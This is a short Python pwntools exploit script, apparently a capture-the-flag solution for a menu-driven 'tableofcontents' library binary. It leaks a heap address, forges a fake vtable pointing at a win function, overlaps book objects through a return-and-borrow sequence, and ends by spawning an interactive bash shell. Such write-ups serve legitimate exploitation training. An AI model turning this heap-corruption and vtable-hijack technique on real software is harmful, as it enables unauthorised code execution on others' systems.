#!/bin/env python3

from pwn import *

winAddress = 0x401E30
nullPtr = 0x0

def skipMenu(p):
    p.recv()

def addPage(p, content, index):
    p.sendline(b'3')
    p.recv()
    p.sendline(str(index))
    p.recv()
    p.sendline(b'2')
    p.recv()
    p.sendline(str(len(content)))
    p.recv()
    p.sendline(content)
    p.recv()

def donateBook(p, title):
    p.sendline(b'1')
    p.recv()
    p.sendline(title)
    skipMenu(p)

def borrowBook(p, index) -> int:
    p.sendline(b'3')
    p.recv()
    p.sendline(str(index))
    p.recv()
    p.sendline(b'1')
    p.recvuntil(":")
    addrLine = p.recvline()
    p.recv()
    return int(addrLine[3:-1], 16)

def returnBook(p, address):
    p.sendline(b'4')
    p.recv()
    p.sendline(hex(address))
    p.recv()

def valuableFeedback(p, funnyBook, command):
    p.sendline(b'5')
    p.recv()
    p.sendline(str(funnyBook))
    p.recv()
    p.sendline(command)
    p.interactive()


def makeVtPtr(address):
    return address.to_bytes(8, byteorder='little')

vtable = (makeVtPtr(nullPtr) * 5) + makeVtPtr(winAddress) + b'a' * 16
p = process("./tableofcontents")
# p = remote(HOST, PORT)
skipMenu(p)
donateBook(p, "book1")
donateBook(p, "book2")
donateBook(p, "book3")
add = borrowBook(p,0)
book = makeVtPtr(add) + b'a' * 56
secondBookAddress = add + 0x70
addPage(p, vtable, 2)
returnBook(p, secondBookAddress)
borrowBook(p, 1)
addPage(p, book, 2)
log.info("Spawning a Shell, have fun!")
valuableFeedback(p, 1, 'bash')